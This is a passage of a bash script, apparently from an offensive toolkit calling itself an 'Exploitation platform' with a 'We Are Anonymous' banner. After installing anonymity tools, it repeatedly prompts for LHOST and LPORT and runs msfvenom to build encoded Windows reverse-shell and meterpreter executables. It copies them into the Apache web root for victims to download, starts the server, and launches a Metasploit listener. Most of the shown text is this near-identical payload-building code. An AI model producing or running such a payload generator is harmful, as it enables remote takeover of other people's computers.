git clone https://github.com/Hackplayers/4nonimizer.git
		cd 4nonimizer
		chmod +x 4nonimizer
		./4nonimizer install
		clear
		cd
		apt-get -y install python-pip
		apt-get -y install php-curl
		gem install pcaprub
		gem install packetfu
echo $GREEN"[*]Finishing....."
sleep 7
clear
else
if [[ $install = N || $install = n ]];then
clear
fi
fi

}



######HOME

function homenu {
clear
echo
echo
echo ""$GREEN
echo "################################################################################################"
echo "                                                                                                "
echo "                                                                                                "
echo "[*]We Are Anonymous !!                                                                          "$BLUE
echo "                                                                                                "
echo "                               Stay Anonymous Bro :)                                            "                                         
echo "                                                                                                "
echo "                                                                                                "
echo ""                              "$BLUE Disappearance on the Internet""$RED                       "
echo "                                                                                                "
echo "                                                                                                "
echo "      █████╗ ███╗   ██╗ ██████╗ ███╗   ██╗██╗   ██╗███╗   ███╗ ██████╗ ██╗   ██╗███████╗        "
echo "     ██╔══██╗████╗  ██║██╔═══██╗████╗  ██║╚██╗ ██╔╝████╗ ████║██╔═══██╗██║   ██║██╔════╝        "
echo "     ███████║██╔██╗ ██║██║   ██║██╔██╗ ██║ ╚████╔╝ ██╔████╔██║██║   ██║██║   ██║███████╗        "
echo "     ██╔══██║██║╚██╗██║██║   ██║██║╚██╗██║  ╚██╔╝  ██║╚██╔╝██║██║   ██║██║   ██║╚════██║        "
echo "     ██║  ██║██║ ╚████║╚██████╔╝██║ ╚████║   ██║   ██║ ╚═╝ ██║╚██████╔╝╚██████╔╝███████║        "
echo "     ╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚═╝     ╚═╝ ╚═════╝  ╚═════╝ ╚══════╝>tools  "
echo "                                                                                                "$GREEN
echo "################################################################################################"$BLUE
echo "                                 let's install Anonymous tools                                  "$GREEN
echo "################################################################################################"
echo -e ""
echo -e ""$BLUE
select Anonselc in "install(4nonimizer)" "install anonsurf" "install Anonym8" "install TorGhost" "Exit"; do
case $Anonselc in
           "install(4nonimizer)")
                  non
                  clear ;;
           "install anonsurf")
                  anonsurf
                  clear ;;
           "install Anonym8")
                  anonym8
                  clear ;;
           "install TorGhost")
                  torghost
                  clear ;;
           "Exit")
                  clear && exit 0 ;;

		
	   * ) echo "$RED[x]$BLUE The error of your choice does not exist";sleep 2;

		screwup
		clear ;;


esac

break

done
}

while true; do homenu; done

else

if [ $word = 18 ];then
clear $BLUE
echo
echo "Please wait..............." 
echo
GAT=`ip route | grep "static" | awk {'print $3'}`  
In=`netstat -r | grep "default" | awk {'print $8'}`
Qu=$(zenity --question --title "Do you use this interface ?" --text "-:[ $In ? ]:-" --width 300) > /dev/null 2>&1
     if [ "$?" -eq "0" ]; then
       inter="$In"

else

  zenity --info --title="INTERFACE -> ABORTED" --text "Please check your network connection\nor manually input your interface in use" --width 350 > /dev/null 2>&1
  echo ${GREEN}[*]${RED}:${GREEN}[Available Network Interfaces]: ${RED};
  echo ""
  cat /proc/net/dev | tr -s  ' ' | cut -d ' ' -f1,2 | sed -e '1,2d'
  echo ""
  inter=$(zenity --title="Enter interface in use" --text "example: wlan0 Or eth0" --entry --width 300) > /dev/null 2>&1

fi




EE=YES

if [ $EE = NO ];then
myip2=Security
else
myip2=`wget -q -O - checkip.dyndns.org | sed -e 's/[^[:digit:]|.]//g'`
fi

clear
echo "" $BLUE
echo "checking if $RED[METASPLOIT]$BLUE exists$RED........"
sleep 2
echo
if [ -f /usr/bin/msfconsole ];then 
echo "$BLUE[*]$RED:$BLUE[Metasploit]:${white}installation found...$BLUE"
sleep 2
else
th=this
echo
echo "$RED[!]${GREEN}Metasploit is not installation "
echo
echo $RED[x]:[waring]:$BLUE$th module needs $RED[Metasploit]$BLUE to work
echo ""$GREEN
echo ""
echo -n "Do you want install Metasploit ?$RED [Y/N] :$BLUE "
read meta
if [[ $meta = Y || $meta = y ]];then
clear
echo
echo $RED
echo "=========== install Metasploit for you ==========="
sleep 4
echo "[*]working........."
sleep 1
apt-get -y install metasploit-framework
echo
echo $GREEN"Done! Metasploit has been installed !"
echo
read -p "now press Enter to continue :)"
clear
else
if [[ $meta = N || $meta = n ]];then
clear
./DHH.sh
fi
fi
fi
echo ""$BLUE
echo "checking if $RED[MSFVENOM]$BLUE exists$RED........"
sleep 2
echo
if [ -f /usr/bin/msfvenom ];then
   echo $BLUE[*]$RED:$BLUE[Msfvenom]:${white}installation found...$BLUE
sleep 1 
  
else
th=this
echo
echo"$RED[!]${GREEN}Msfvenom is not installation "
echo
echo $RED[x]:[waring]:$BLUE$th module needs $RED[Msfvenom]$BLUE to work
echo
pl=please
echo $BLUE[*]$RED:$BLUE$pl install $RED[Msfvenom]$BLUE and try again ":)" 
   sleep 4
   exit
   

fi
echo
echo "checking if $RED[APACHE SERVER]$BLUE exists$RED........"
echo
sleep 2
if [ -d /var/www/html ];then
echo $BLUE[*]$RED:$BLUE[Apache]:${white}installation found...
   sleep 1
else

th=this
echo
echo "$RED[!]${GREEN}Apache Server is not installation "  
echo
echo $RED[x]:[waring]:$BLUE$th module needs $RED[Apache server]$BLUE to work
echo
echo
echo -n "Do you want install Apache Server  ?$RED [Y/N] :$BLUE "
read apac
if [[ $apac = Y || $apac = y ]];then
clear
echo
echo $RED
echo "=========== install Apache Server for you ==========="
sleep 4
echo "[*]working........."
sleep 1
apt-get -y install apache2 
echo
echo $GREEN"Done! Apache Server has been installed !"
echo
read -p "now press Enter to continue :)"
clear
else
if [[ $apac = N || $apac = n ]];then
clear
./DHH.sh
fi
fi
fi
echo "" $BLUE
echo "checking $RED[internet]$BLUE connections$RED........"
sleep 2
  ping -i 01 -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]
then
sleep 3
clear
echo
echo "$RED[!]$BLUE You Are Not Connect To The Internet"
echo
echo "$RED[*]warning[$GREEN This Modules need to connect to the internet ] "$BLUE
echo
echo -n "Do You Want continue without the Internet ?$RED [Y/N]$GREEN : "
read net
if [[ $net = N || $net = n ]];then
clear
echo
echo "" $BLUE
echo "[!]Please Connect To The Internet And Try Again :) "
echo
exit
else
if [[ $net = Y || $net = y ]];then
clear
myip=?
myip2=?
In=?
GAT=?
fi
fi
else
echo
echo $BLUE[*]$RED:$BLUE[Internet]:$GREEN[CONNECT Fonud$white...$GREEN]
sleep 1
echo
echo "" $GREEN
echo "Welcome to $RED[-> [ Exploitation platform ] <-]" 
sleep 3
fi

clear

winre () {
clear
echo
echo
echo "please wait.......... "
sleep 2
clear
echo ""$BLUE
echo "------------------------------------------"
echo "Your Local IP Address:[ $myip             "
echo "                                          "
echo "Your Public IP Address:[ $myip2           "       
echo "                                          "
echo "------------------------------------------"
echo "" $GREEN
echo -n "Enter LHOST=$RED"
read host
echo ""$GREEN
sleep 1
echo "LHOST==>$BLUE $host "$GREEN
echo
echo "==========================="
sleep 1
echo
echo -n "Enter LPORT=$RED"
read port
echo $GREEN
sleep 1
echo "LPORT==>$BLUE $port"$GREEN
echo
echo "==========================="
sleep 1
echo
echo -n "Enter name for payload=$RED"
read name
echo $GREEN
sleep 1
echo "NAME==>$BLUE $name "$GREEN
echo
echo "==========================="
sleep 1
echo
clear
echo
echo
echo " Payload [exe] Final Config:       "
echo "==================================="
echo "$BLUE LHOST      $GREEN:>$RED $host $GREEN"                                                                     
echo "$BLUE LPORT      $GREEN:>$RED $port $GREEN"                                           
echo "$BLUE NAME       $GREEN:>$RED $name $GREEN"                                           
echo "$BLUE PAYLOAD    $GREEN:>$RED windows/meterpreter/reverse_tcp $GREEN "              
echo "$BLUE SAVE IN    $GREEN:>$RED /root/Desktop/Output/$name and /var/www/$name $GREEN"   
sleep 3
cd $hh/Desktop/
if [ -d Output ];then
echo
echo "Found Output "
sleep 1
else
mkdir Output
fi
cd ..
wind=.exe
echo
echo
sleep 1
echo
echo $BLUE"[*]$RED:$GREEN Create $RED [$BLUE $name $RED] "
sleep 1
xterm -T "DHH - Create [$name]" -geometry 99x23 -e "msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -f exe LHOST=$host LPORT=$port > $hh/Desktop/Output/$name$wind"
echo
echo $BLUE"[*]$RED:$GREEN Done! "
sleep 1
echo
echo "$BLUE[*]$GREEN cp$RED:$BLUE[$RED $name $GREEN to $RED /var/www/html/$name$BLUE ]"
cd $hh/Desktop/Output/
chmod +x $name$wind
cp $name$wind /var/www/html
echo
echo "Done ! "
sleep 2
echo "" $GREEN
echo "[*]$RED:$BLUE STARTING APACHE SERVER$RED.........."
sleep 2
xterm -T "DHH - start Apache webserver" -geometry 110x23 -e "service apache2 start"
         echo $BLUE[*]$RED:$RED[start apache2]$RED:$GREEN[ OK ]
sleep 2
echo 
echo "[*]Done apache server has been started " 
sleep 2
echo
echo
echo "$RED Done Payload has been Created in$GREEN ->>>$BLUE[ /root/Desktop/Output/$name and /var/www/html/$name ]"
echo
echo
sleep 7
clear
echo
echo
echo $BLUE" WHAT  YOU  WANT  "
echo $BLUE"================= "
echo
echo "1 - create Listener  on [$GREEN $name $BLUE]"
echo "2 - back to the menu " $GREEN
echo
echo -n "Enter choice ->> "$RED
read choice
if [ $choice = 1 ];then
clear
echo
echo
echo "starting Listener  on $BLUE[ $name ]"
sleep 1
xterm -T "DHH - [$name] Listenner" -geometry 99x23 -e " msfconsole -x 'use exploit/multi/handler; set LHOST $host; set LPORT $port; set PAYLOAD windows/meterpreter/reverse_tcp; exploit -j'"
else

if [ $choice = 2 ];then
clear
fi
fi

}

winhtt () {
clear
echo
echo
echo "please wait.......... "
sleep 2
clear
echo ""$BLUE
echo "------------------------------------------"
echo "Your Local IP Address:[ $myip             "
echo "                                          "
echo "Your Public IP Address:[ $myip2           "       
echo "                                          "
echo "------------------------------------------"
echo "" $GREEN
echo -n "Enter LHOST=$RED"
read host
echo ""$GREEN
sleep 1
echo "LHOST==>$BLUE $host "$GREEN
echo
echo "==========================="
sleep 1
echo
echo -n "Enter LPORT=$RED"
read port
echo $GREEN
sleep 1
echo "LPORT==>$BLUE $port"$GREEN
echo
echo "==========================="
sleep 1
echo
echo -n "Enter name for payload=$RED"
read name
echo $GREEN
sleep 1
echo "NAME==>$BLUE $name "$GREEN
echo
echo "==========================="
sleep 1
echo
clear
echo
echo
echo " Payload [exe] Final Config:       "
echo "==================================="
echo "$BLUE LHOST      $GREEN:>$RED $host $GREEN"                                                                     
echo "$BLUE LPORT      $GREEN:>$RED $port $GREEN"                                           
echo "$BLUE NAME       $GREEN:>$RED $name $GREEN"                                           
echo "$BLUE PAYLOAD    $GREEN:>$RED windows/meterpreter/reverse_http $GREEN "              
echo "$BLUE SAVE IN    $GREEN:>$RED /root/Desktop/Output/$name and /var/www/$name $GREEN"   
sleep 3
cd $hh/Desktop/
if [ -d Output ];then
echo
echo "Found Output "
sleep 1
else
mkdir Output
fi
cd ..
wind=.exe
echo
echo
sleep 1
echo
echo $BLUE"[*]$RED:$GREEN Create $RED [$BLUE $name $RED] "
sleep 1
xterm -T "DHH - Create [$name]" -geometry 99x23 -e "msfvenom -p windows/meterpreter/reverse_http -e x86/shikata_ga_nai -f exe LHOST=$host LPORT=$port > $hh/Desktop/Output/$name$wind"
echo
echo $BLUE"[*]$RED:$GREEN Done! "
sleep 1
echo
echo "$BLUE[*]$GREEN cp$RED:$BLUE[$RED $name $GREEN to $RED /var/www/html/$name$BLUE ]"
cd $hh/Desktop/Output/
chmod +x $name$wind
cp $name$wind /var/www/html
echo
echo "Done ! "
sleep 2
echo "" $GREEN
echo "[*]$RED:$BLUE STARTING APACHE SERVER$RED.........."
sleep 2
xterm -T "DHH - start Apache webserver" -geometry 110x23 -e "service apache2 start"
         echo $BLUE[*]$RED:$RED[start apache2]$RED:$GREEN[ OK ]
sleep 2
echo 
echo "[*]Done apache server has been started " 
sleep 2
echo
echo
echo "$RED Done Payload has been Created in$GREEN ->>>$BLUE[ /root/Desktop/Output/$name and /var/www/html/$name ]"
echo
echo
sleep 7
clear
echo
echo
echo $BLUE" WHAT  YOU  WANT  "
echo $BLUE"================= "
echo
echo "1 - create Listener  on [$GREEN $name $BLUE]"
echo "2 - back to the menu " $GREEN
echo
echo -n "Enter choice ->> "$RED
read choice
if [ $choice = 1 ];then
clear
echo
echo
echo "starting Listener  on $BLUE[ $name ]"
sleep 1
xterm -T "DHH - [$name] Listenner" -geometry 99x23 -e " msfconsole -x 'use exploit/multi/handler; set LHOST $host; set LPORT $port; set PAYLOAD windows/meterpreter/reverse_http; exploit -j'"

else

if [ $choice = 2 ];then
clear
fi
fi

}

exie () {
exie 
 
}

winhttps () {
clear
echo
echo
echo "please wait.......... "
sleep 2
clear
echo ""$BLUE
echo "------------------------------------------"
echo "Your Local IP Address:[ $myip             "
echo "                                          "
echo "Your Public IP Address:[ $myip2           "       
echo "                                          "
echo "------------------------------------------"
echo "" $GREEN
echo -n "Enter LHOST=$RED"
read host
echo ""$GREEN
sleep 1
echo "LHOST==>$BLUE $host "$GREEN
echo
echo "==========================="
sleep 1
echo
echo -n "Enter LPORT=$RED"
read port
echo $GREEN
sleep 1
echo "LPORT==>$BLUE $port"$GREEN
echo
echo "==========================="
sleep 1
echo
echo -n "Enter name for payload=$RED"
read name
echo $GREEN
sleep 1
echo "NAME==>$BLUE $name "$GREEN
echo
echo "==========================="
sleep 1
echo
clear
echo
echo
echo " Payload [exe] Final Config:       "
echo "==================================="
echo "$BLUE LHOST      $GREEN:>$RED $host $GREEN"                                                                     
echo "$BLUE LPORT      $GREEN:>$RED $port $GREEN"                                           
echo "$BLUE NAME       $GREEN:>$RED $name $GREEN"                                           
echo "$BLUE PAYLOAD    $GREEN:>$RED windows/meterpreter/reverse_https $GREEN "              
echo "$BLUE SAVE IN    $GREEN:>$RED /root/Desktop/Output/$name and /var/www/$name $GREEN"   
sleep 3
cd $hh/Desktop/
if [ -d Output ];then
echo
echo "Found Output "
sleep 1
else
mkdir Output
fi
cd ..
wind=.exe
echo
echo
sleep 1
echo
echo $BLUE"[*]$RED:$GREEN Create $RED [$BLUE $name $RED] "
sleep 1
xterm -T "DHH - Create [$name]" -geometry 99x23 -e "msfvenom -p windows/meterpreter/reverse_https -e x86/shikata_ga_nai -f exe LHOST=$host LPORT=$port > $hh/Desktop/Output/$name$wind"
echo
echo $BLUE"[*]$RED:$GREEN Done! "
sleep 1
echo
echo "$BLUE[*]$GREEN cp$RED:$BLUE[$RED $name $GREEN to $RED /var/www/html/$name$BLUE ]"
cd $hh/Desktop/Output/
chmod +x $name$wind
cp $name$wind /var/www/html
echo
echo "Done ! "
sleep 2
echo "" $GREEN
echo "[*]$RED:$BLUE STARTING APACHE SERVER$RED.........."
sleep 2
xterm -T "DHH - start Apache webserver" -geometry 110x23 -e "service apache2 start"
         echo $BLUE[*]$RED:$RED[start apache2]$RED:$GREEN[ OK ]
sleep 2
echo 
echo "[*]Done apache server has been started " 
sleep 2
echo
echo
echo "$RED Done Payload has been Created in$GREEN ->>>$BLUE[ /root/Desktop/Output/$name and /var/www/html/$name ]"
echo
echo
sleep 7
clear
echo
echo
echo $BLUE" WHAT  YOU  WANT  "
echo $BLUE"================= "
echo
echo "1 - create Listener  on [$GREEN $name $BLUE]"
echo "2 - back to the menu " $GREEN
echo
echo -n "Enter choice ->> "$RED
read choice
if [ $choice = 1 ];then
clear
echo
echo
echo "starting Listener  on $BLUE[ $name ]"
sleep 1
xterm -T "DHH - [$name] Listenner" -geometry 99x23 -e " msfconsole -x 'use exploit/multi/handler; set LHOST $host; set LPORT $port; set PAYLOAD windows/meterpreter/reverse_https; exploit -j'"

else

if [ $choice = 2 ];then
clear
fi
fi

}

sheel () {
clear
echo
echo
echo "please wait.......... "
sleep 2
clear
echo ""$BLUE
echo "------------------------------------------"
echo "Your Local IP Address:[ $myip             "
echo "                                          "
echo "Your Public IP Address:[ $myip2           "       
echo "                                          "
echo "------------------------------------------"
echo "" $GREEN
echo -n "Enter LHOST=$RED"
read host
echo ""$GREEN
sleep 1
echo "LHOST==>$BLUE $host "$GREEN
echo
echo "==========================="
sleep 1
echo
echo -n "Enter LPORT=$RED"
read port
echo $GREEN
sleep 1
echo "LPORT==>$BLUE $port"$GREEN
echo
echo "==========================="
sleep 1
echo
echo -n "Enter name for payload=$RED"
read name
echo $GREEN
sleep 1
echo "NAME==>$BLUE $name "$GREEN
echo
echo "==========================="
sleep 1
echo
clear
echo
echo
echo " Payload [exe] Final Config:       "
echo "==================================="
echo "$BLUE LHOST      $GREEN:>$RED $host $GREEN"                                                                     
echo "$BLUE LPORT      $GREEN:>$RED $port $GREEN"                                           
echo "$BLUE NAME       $GREEN:>$RED $name $GREEN"                                           
echo "$BLUE PAYLOAD    $GREEN:>$RED windows/shell/reverse_tcp $GREEN "              
echo "$BLUE SAVE IN    $GREEN:>$RED /root/Desktop/Output/$name and /var/www/$name $GREEN"   
sleep 3
cd $hh/Desktop/
if [ -d Output ];then
echo
echo "Found Output "
sleep 1
else
mkdir Output
fi
cd ..
wind=.exe
echo
echo
sleep 1
echo
echo $BLUE"[*]$RED:$GREEN Create $RED [$BLUE $name $RED] "
sleep 1
xterm -T "DHH - Create [$name]" -geometry 99x23 -e "msfvenom -p windows/shell/reverse_tcp -e x86/shikata_ga_nai -f exe LHOST=$host LPORT=$port > $hh/Desktop/Output/$name$wind"
echo
echo $BLUE"[*]$RED:$GREEN Done! "
sleep 1
echo
echo "$BLUE[*]$GREEN cp$RED:$BLUE[$RED $name $GREEN to $RED /var/www/html/$name$BLUE ]"
cd $hh/Desktop/Output/
chmod +x $name$wind
cp $name$wind /var/www/html
echo
echo "Done ! "
sleep 2
echo "" $GREEN
echo "[*]$RED:$BLUE STARTING APACHE SERVER$RED.........."
sleep 2
xterm -T "DHH - start Apache webserver" -geometry 110x23 -e "service apache2 start"
         echo $BLUE[*]$RED:$RED[start apache2]$RED:$GREEN[ OK ]
sleep 2
echo 
echo "[*]Done apache server has been started " 
sleep 2
echo
echo
echo "$RED Done Payload has been Created in$GREEN ->>>$BLUE[ /root/Desktop/Output/$name and /var/www/html/$name ]"
echo
echo
sleep 7
clear
echo
echo
echo $BLUE" WHAT  YOU  WANT  "
echo $BLUE"================= "
echo
echo "1 - create Listener  on [$GREEN $name $BLUE]"
echo "2 - back to the menu " $GREEN
echo
echo -n "Enter choice ->> "$RED
read choice
if [ $choice = 1 ];then
clear
echo
echo
echo "starting Listener  on $BLUE[ $name ]"
sleep 1
xterm -T "DHH - [$name] Listenner" -geometry 99x23 -e " msfconsole -x 'use exploit/multi/handler; set LHOST $host; set LPORT $port; set PAYLOAD windows/shell/reverse_tcp; exploit -j'"

else

if [ $choice = 2 ];then
clear
fi
fi

}

sh_x64 () {
clear
echo
echo
echo "please wait.......... "
sleep 2
clear
echo ""$BLUE
echo "------------------------------------------"
echo "Your Local IP Address:[ $myip             "
echo "                                          "
echo "Your Public IP Address:[ $myip2           "       
echo "                                          "
echo "------------------------------------------"
echo "" $GREEN
echo -n "Enter LHOST=$RED"
read host
echo ""$GREEN
sleep 1
echo "LHOST==>$BLUE $host "$GREEN
echo
echo "==========================="
sleep 1
echo
echo -n "Enter LPORT=$RED"
read port
echo $GREEN
sleep 1
echo "LPORT==>$BLUE $port"$GREEN
echo
echo "==========================="
sleep 1
echo
echo -n "Enter name for payload=$RED"
read name
echo $GREEN
sleep 1
echo "NAME==>$BLUE $name "$GREEN
echo
echo "==========================="
sleep 1
echo
clear
echo
echo
echo " Payload [exe] Final Config:       "
echo "==================================="
echo "$BLUE LHOST      $GREEN:>$RED $host $GREEN"                                                                     
echo "$BLUE LPORT      $GREEN:>$RED $port $GREEN"                                           
echo "$BLUE NAME       $GREEN:>$RED $name $GREEN"    
echo "$BLUE PAYLOAD    $GREEN:>$RED windows/x64/shell/reverse_tcp $GREEN "              
echo "$BLUE SAVE IN    $GREEN:>$RED /root/Desktop/Output/$name and /var/www/$name $GREEN"   
sleep 3
cd $hh/Desktop/
if [ -d Output ];then
echo
echo "Found Output "
sleep 1
else
mkdir Output
fi
cd ..
wind=.exe
echo
echo
sleep 1
echo
echo $BLUE"[*]$RED:$GREEN Create $RED [$BLUE $name $RED] "
sleep 1
xterm -T "DHH - Create [$name]" -geometry 99x23 -e "msfvenom -p windows/x64/shell/reverse_tcp -e x86/shikata_ga_nai -f exe LHOST=$host LPORT=$port > $hh/Desktop/Output/$name$wind"
echo
echo $BLUE"[*]$RED:$GREEN Done! "
sleep 1
echo
echo "$BLUE[*]$GREEN cp$RED:$BLUE[$RED $name $GREEN to $RED /var/www/html/$name$BLUE ]"
cd $hh/Desktop/Output/
chmod +x $name$wind
cp $name$wind /var/www/html
echo
echo "Done ! "
sleep 2
echo "" $GREEN
echo "[*]$RED:$BLUE STARTING APACHE SERVER$RED.........."
sleep 2
xterm -T "DHH - start Apache webserver" -geometry 110x23 -e "service apache2 start"
         echo $BLUE[*]$RED:$RED[start apache2]$RED:$GREEN[ OK ]
sleep 2
echo 
echo "[*]Done apache server has been started " 
sleep 2
echo
echo
echo "$RED Done Payload has been Created in$GREEN ->>>$BLUE[ /root/Desktop/Output/$name and /var/www/html/$name ]"
echo
echo
sleep 7
clear
echo
echo
echo $BLUE" WHAT  YOU  WANT  "
echo $BLUE"================= "
echo
echo "1 - create Listener  on [$GREEN $name $BLUE]"
echo "2 - back to the menu " $GREEN
echo
echo -n "Enter choice ->> "$RED
read choice
if [ $choice = 1 ];then
clear
echo
echo
echo "starting Listener  on $BLUE[ $name ]"
sleep 1
xterm -T "DHH - [$name] Listenner" -geometry 99x23 -e " msfconsole -x 'use exploit/multi/handler; set LHOST $host; set LPORT $port; set PAYLOAD windows/x64/shell/reverse_tcp; exploit -j'"

else

if [ $choice = 2 ];then
clear
fi
fi

}

sh_ipv6 () {
clear
echo
echo
echo "please wait.......... "
sleep 2
clear
echo ""$BLUE
echo "------------------------------------------"
echo "Your Local IP Address:[ $myip             "
echo "                                          "
echo "Your Public IP Address:[ $myip2           "       
echo "                                          "
echo "------------------------------------------"
echo "" $GREEN
echo -n "Enter LHOST=$RED"
read host
echo ""$GREEN
sleep 1
echo "LHOST==>$BLUE $host "$GREEN
echo
echo "==========================="
sleep 1
echo
echo -n "Enter LPORT=$RED"
read port
echo $GREEN
sleep 1
echo "LPORT==>$BLUE $port"$GREEN
echo
echo "==========================="
sleep 1
echo
echo -n "Enter name for payload=$RED"
read name
echo $GREEN
sleep 1
echo "NAME==>$BLUE $name "$GREEN
echo
echo "==========================="
sleep 1
echo
clear
echo
echo
echo " Payload [exe] Final Config:       "
echo "==================================="
echo "$BLUE LHOST      $GREEN:>$RED $host $GREEN"                                                                     
echo "$BLUE LPORT      $GREEN:>$RED $port $GREEN"                                           
echo "$BLUE NAME       $GREEN:>$RED $name $GREEN"                                        
echo "$BLUE PAYLOAD    $GREEN:>$RED windows/shell/reverse_ipv6_tcp $GREEN "              
echo "$BLUE SAVE IN    $GREEN:>$RED /root/Desktop/Output/$name and /var/www/$name $GREEN"   
sleep 3
cd $hh/Desktop/
if [ -d Output ];then
echo
echo "Found Output "
sleep 1
else
mkdir Output
fi
cd ..
wind=.exe
echo
echo
sleep 1
echo
echo $BLUE"[*]$RED:$GREEN Create $RED [$BLUE $name $RED] "
sleep 1
xterm -T "DHH - Create [$name]" -geometry 99x23 -e "msfvenom -p windows/shell/reverse_ipv6_tcp -e x86/shikata_ga_nai -f exe LHOST=$host LPORT=$port > $hh/Desktop/Output/$name$wind"
echo
echo $BLUE"[*]$RED:$GREEN Done! "
sleep 1
echo
echo "$BLUE[*]$GREEN cp$RED:$BLUE[$RED $name $GREEN to $RED /var/www/html/$name$BLUE ]"
cd $hh/Desktop/Output/
chmod +x $name$wind
cp $name$wind /var/www/html
echo
echo "Done ! "
sleep 2
echo "" $GREEN
echo "[*]$RED:$BLUE STARTING APACHE SERVER$RED.........."
sleep 2
xterm -T "DHH - start Apache webserver" -geometry 110x23 -e "service apache2 start"
         echo $BLUE[*]$RED:$RED[start apache2]$RED:$GREEN[ OK ]
sleep 2
echo 
echo "[*]Done apache server has been started " 
sleep 2
echo
echo
echo "$RED Done Payload has been Created in$GREEN ->>>$BLUE[ /root/Desktop/Output/$name and /var/www/html/$name ]"
echo
echo
sleep 7
clear
echo
echo
echo $BLUE" WHAT  YOU  WANT  "
echo $BLUE"================= "
echo
echo "1 - create Listener  on [$GREEN $name $BLUE]"
echo "2 - back to the menu " $GREEN
echo
echo -n "Enter choice ->> "$RED
read choice
if [ $choice = 1 ];then
clear
echo
echo
echo "starting Listener  on $BLUE[ $name ]"
sleep 1
xterm -T "DHH - [$name] Listenner" -geometry 99x23 -e " msfconsole -x 'use exploit/multi/handler; set LHOST $host; set LPORT $port; set PAYLOAD windows/shell/reverse_ipv6_tcp; exploit -j'"

else

if [ $choice = 2 ];then
clear
fi
fi

}

sh_non () {
clear
echo
echo
echo "please wait.......... "
sleep 2
clear
echo ""$BLUE
echo "------------------------------------------"
echo "Your Local IP Address:[ $myip             "
echo "                                          "
echo "Your Public IP Address:[ $myip2           "       
echo "                                          "
echo "------------------------------------------"
echo "" $GREEN
echo -n "Enter LHOST=$RED"
read host
echo ""$GREEN
sleep 1
echo "LHOST==>$BLUE $host "$GREEN
echo
echo "==========================="
sleep 1
echo
echo -n "Enter LPORT=$RED"
read port
echo $GREEN
sleep 1
echo "LPORT==>$BLUE $port"$GREEN
echo
echo "==========================="
sleep 1
echo
echo -n "Enter name for payload=$RED"
read name
echo $GREEN
sleep 1
echo "NAME==>$BLUE $name "$GREEN
echo
echo "==========================="
sleep 1
echo
clear
echo
echo
echo " Payload [exe] Final Config:       "
echo "==================================="
echo "$BLUE LHOST      $GREEN:>$RED $host $GREEN"                                                                     
echo "$BLUE LPORT      $GREEN:>$RED $port $GREEN"                                           
echo "$BLUE NAME       $GREEN:>$RED $name $GREEN"                                            
echo "$BLUE PAYLOAD    $GREEN:>$RED windows/shell/reverse_nonx_tcp $GREEN "              
echo "$BLUE SAVE IN    $GREEN:>$RED /root/Desktop/Output/$name and /var/www/$name $GREEN"   
sleep 3
cd $hh/Desktop/
if [ -d Output ];then
echo
echo "Found Output "
sleep 1
else
mkdir Output
fi
cd ..
wind=.exe
echo
echo
sleep 1
echo
echo $BLUE"[*]$RED:$GREEN Create $RED [$BLUE $name $RED] "
sleep 1
xterm -T "DHH - Create [$name]" -geometry 99x23 -e "msfvenom -p windows/shell/reverse_nonx_tcp -e x86/shikata_ga_nai -f exe LHOST=$host LPORT=$port > $hh/Desktop/Output/$name$wind"
echo
echo $BLUE"[*]$RED:$GREEN Done! "
sleep 1
echo
echo "$BLUE[*]$GREEN cp$RED:$BLUE[$RED $name $GREEN to $RED /var/www/html/$name$BLUE ]"
cd $hh/Desktop/Output/
chmod +x $name$wind
cp $name$wind /var/www/html
echo
echo "Done ! "
sleep 2
echo "" $GREEN
echo "[*]$RED:$BLUE STARTING APACHE SERVER$RED.........."
sleep 2
xterm -T "DHH - start Apache webserver" -geometry 110x23 -e "service apache2 start"
         echo $BLUE[*]$RED:$RED[start apache2]$RED:$GREEN[ OK ]
sleep 2
echo 
echo "[*]Done apache server has been started " 
sleep 2
echo
echo
echo "$RED Done Payload has been Created in$GREEN ->>>$BLUE[ /root/Desktop/Output/$name and /var/www/html/$name ]"
echo
echo
sleep 7
clear
echo
echo
echo $BLUE" WHAT  YOU  WANT  "
echo $BLUE"================= "
echo
echo "1 - create Listener  on [$GREEN $name $BLUE]"
echo "2 - back to the menu " $GREEN
echo
echo -n "Enter choice ->> "$RED
read choice
if [ $choice = 1 ];then
clear
echo
echo
echo "starting Listener  on $BLUE[ $name ]"
sleep 1
xterm -T "DHH - [$name] Listenner" -geometry 99x23 -e " msfconsole -x 'use exploit/multi/handler; set LHOST $host; set LPORT $port; set PAYLOAD windows/shell/reverse_nonx_tcp; exploit -j'"

else

if [ $choice = 2 ];then
clear
fi
fi

}

sh_ord () {
clear
echo
echo
echo "please wait.......... "
sleep 2
clear
echo ""$BLUE
echo "------------------------------------------"
echo "Your Local IP Address:[ $myip             "
echo "                                          "
echo "Your Public IP Address:[ $myip2           "       
echo "                                          "
echo "------------------------------------------"
echo "" $GREEN
echo -n "Enter LHOST=$RED"
read host
echo ""$GREEN
sleep 1
echo "LHOST==>$BLUE $host "$GREEN
echo
echo "==========================="
sleep 1
echo
echo -n "Enter LPORT=$RED"
read port
echo $GREEN
sleep 1
echo "LPORT==>$BLUE $port"$GREEN
echo
echo "==========================="
sleep 1
echo
echo -n "Enter name for payload=$RED"
read name
echo $GREEN
sleep 1
echo "NAME==>$BLUE $name "$GREEN
echo
echo "==========================="
sleep 1
echo
clear
echo
echo
echo " Payload [exe] Final Config:       "
echo "==================================="
echo "$BLUE LHOST      $GREEN:>$RED $host $GREEN"                                                                     
echo "$BLUE LPORT      $GREEN:>$RED $port $GREEN"                                           
echo "$BLUE NAME       $GREEN:>$RED $name $GREEN"                                             
echo "$BLUE PAYLOAD    $GREEN:>$RED windows/shell/reverse_ord_tcp $GREEN "              
echo "$BLUE SAVE IN    $GREEN:>$RED /root/Desktop/Output/$name and /var/www/$name $GREEN"   
sleep 3
cd $hh/Desktop/
if [ -d Output ];then
echo
echo "Found Output "
sleep 1
else
mkdir Output
fi
cd ..
wind=.exe
echo
echo
sleep 1
echo
echo $BLUE"[*]$RED:$GREEN Create $RED [$BLUE $name $RED] "
sleep 1
xterm -T "DHH - Create [$name]" -geometry 99x23 -e "msfvenom -p windows/shell/reverse_ord_tcp -e x86/shikata_ga_nai -f exe LHOST=$host LPORT=$port > $hh/Desktop/Output/$name$wind"
echo
echo $BLUE"[*]$RED:$GREEN Done! "
sleep 1
echo
echo "$BLUE[*]$GREEN cp$RED:$BLUE[$RED $name $GREEN to $RED /var/www/html/$name$BLUE ]"
cd $hh/Desktop/Output/
